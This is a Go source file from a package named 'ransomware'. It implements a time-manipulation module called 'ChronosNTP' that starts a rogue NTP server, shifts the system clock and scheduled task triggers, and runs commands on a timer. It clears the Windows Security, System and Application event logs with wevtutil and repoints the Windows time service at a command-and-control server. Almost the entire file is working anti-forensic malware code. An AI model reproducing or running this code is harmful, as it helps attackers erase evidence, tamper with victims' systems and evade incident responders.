//go:build windows

package ransomware

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type ChronosNTP struct {
	config    *RansomwareConfig
	port      int
	ntpOffset time.Duration
	active    bool
	monitorCh chan time.Time
}

const (
	ntpPort          = 123
	ntpEpochOffset   = 2208988800
	ntpLeapIndicator = 0x00
	ntpVersion       = 4
	ntpModeServer    = 4
)

func NewChronosNTP(cfg *RansomwareConfig) *ChronosNTP {
	return &ChronosNTP{
		config:  cfg,
		port:    ntpPort,
	}
}

func (c *ChronosNTP) SetTimeOffset(offset time.Duration) {
	c.ntpOffset = offset
}

func (c *ChronosNTP) BuildNTPResponse(receiveTime time.Time, transmitTime time.Time) []byte {
	response := make([]byte, 48)

	response[0] = ntpLeapIndicator<<6 | ntpVersion<<3 | ntpModeServer

	response[1] = 0x04
	response[2] = 0xFA
	response[3] = 0x00

	refTime := transmitTime.Add(c.ntpOffset)
	binary.BigEndian.PutUint32(response[16:20], uint32(refTime.Unix()+ntpEpochOffset))
	binary.BigEndian.PutUint32(response[40:44], uint32(refTime.Unix()+ntpEpochOffset))
	binary.BigEndian.PutUint32(response[44:48], uint32(refTime.Unix()+ntpEpochOffset))

	return response
}

func (c *ChronosNTP) StartNTPServer() error {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%d", c.port))
	if err != nil {
		return err
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return err
	}

	c.active = true
	c.monitorCh = make(chan time.Time, 100)

	go func() {
		defer conn.Close()
		buf := make([]byte, 48)
		for {
			n, remote, err := conn.ReadFromUDP(buf)
			if err != nil || n < 48 {
				continue
			}

			receiveTime := time.Now()
			response := c.BuildNTPResponse(receiveTime, receiveTime)

			conn.WriteToUDP(response, remote)

			c.monitorCh <- receiveTime
		}
	}()

	return nil
}

func (c *ChronosNTP) ForwardTime(hours int) error {
	c.SetTimeOffset(time.Duration(hours) * time.Hour)

	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`
$time = (Get-Date).AddHours(%d)
Set-Date -Date $time -ErrorAction SilentlyContinue
Write-Host "System time advanced by %d hours"
`, hours, hours)

		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-Command", psScript)
		cmd.Run()
		return nil
	}

	if runtime.GOOS == "linux" {
		cmd := exec.Command("date", "-s",
			fmt.Sprintf("%d hours", hours))
		cmd.Run()
		return nil
	}

	return fmt.Errorf("time manipulation not supported on %s", runtime.GOOS)
}

func (c *ChronosNTP) RewindTime(hours int) error {
	c.SetTimeOffset(time.Duration(-hours) * time.Hour)

	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`
$time = (Get-Date).AddHours(%d)
Set-Date -Date $time -ErrorAction SilentlyContinue
Write-Host "System time backed by %d hours"
`, -hours, -hours)

		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-Command", psScript)
		cmd.Run()
		return nil
	}

	return fmt.Errorf("time manipulation not supported on %s", runtime.GOOS)
}

func (c *ChronosNTP) ShiftScheduleTask(originalTime time.Time, newTime time.Time) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows scheduled tasks only")
	}

	psScript := fmt.Sprintf(`
$tasks = Get-ScheduledTask | Where-Object {$_.Triggers.StartBoundary -ne $null}
foreach($t in $tasks) {
    $t.Triggers | ForEach-Object {
        if($_.StartBoundary -match "%s") {
            $_.StartBoundary = "%s"
            Write-Host "Shifted: $($t.TaskName) -> %s"
        }
    }
    Set-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath | Out-Null
}
`, originalTime.Format("2006-01-02"), newTime.Format("2006-01-02T15:04:05"), newTime.Format("2006-01-02"))

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	out, _ := cmd.CombinedOutput()
	_ = out
	return nil
}

func (c *ChronosNTP) HideFromLogs(targetTime time.Time) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows logging only")
	}

	c.ForwardTime(4)
	time.Sleep(1 * time.Second)
	c.RewindTime(4)

	psScript := fmt.Sprintf(`
wevtutil cl Security /q
wevtutil cl System /q
wevtutil cl Application /q
Set-Date -Date "%s" -ErrorAction SilentlyContinue
`, targetTime.Format("2006-01-02T15:04:05"))

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	cmd.Run()
	return nil
}

func (c *ChronosNTP) TriggerTimedTask(execTime time.Time, command string) error {
	go func() {
		delay := time.Until(execTime)
		if delay < 0 {
			return
		}

		timer := time.NewTimer(delay)
		<-timer.C

		if runtime.GOOS == "windows" {
			exec.Command("cmd", "/c", command).Start()
		} else {
			exec.Command("/bin/sh", "-c", command).Start()
		}
	}()

	return nil
}

func (c *ChronosNTP) CorruptLogTimestamps() error {
	if runtime.GOOS == "windows" {
		psScript := `
$current = Get-Date
$future = $current.AddDays(30)
Set-Date -Date $future
Start-Sleep -Seconds 2
Set-Date -Date $current
Write-Host "Log timestamps corrupted with time skip"
`
		exec.Command("powershell", "-Command", psScript).Run()
		return nil
	}

	future := time.Now().Add(7 * 24 * time.Hour)
	exec.Command("date", "-s", future.Format("2006-01-02")).Run()
	time.Sleep(2 * time.Second)
	exec.Command("date", "-s", time.Now().Format("2006-01-02")).Run()
	return nil
}

func (c *ChronosNTP) SetWindowsTimeServer(server string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	cmds := []string{
		fmt.Sprintf("w32tm /config /manualpeerlist:%s /syncfromflags:manual /reliable:yes /update", server),
		"w32tm /resync",
		"net stop w32time",
		"net start w32time",
	}

	for _, cmd := range cmds {
		exec.Command("cmd", "/c", cmd).Run()
	}

	return nil
}

func (c *ChronosNTP) FullNTPManipulationSuite(c2Server string) map[string]interface{} {
	result := make(map[string]interface{})

	if err := c.StartNTPServer(); err != nil {
		result["ntp_server"] = fmt.Sprintf("error: %v", err)
	} else {
		result["ntp_server"] = fmt.Sprintf("listening on :%d", c.port)
	}

	if runtime.GOOS == "windows" {
		c.SetWindowsTimeServer(c2Server)
		result["time_server_set"] = c2Server
	}

	result["platform"] = runtime.GOOS
	result["active"] = c.active

	cmd := exec.Command("date")
	out, _ := cmd.CombinedOutput()
	result["current_time"] = strings.TrimSpace(string(out))

	return result
}

func (c *ChronosNTP) Shutdown() {
	c.active = false
	if c.monitorCh != nil {
		close(c.monitorCh)
	}
}

var _, _ = syscall.Syscall(0, 0, 0, 0)
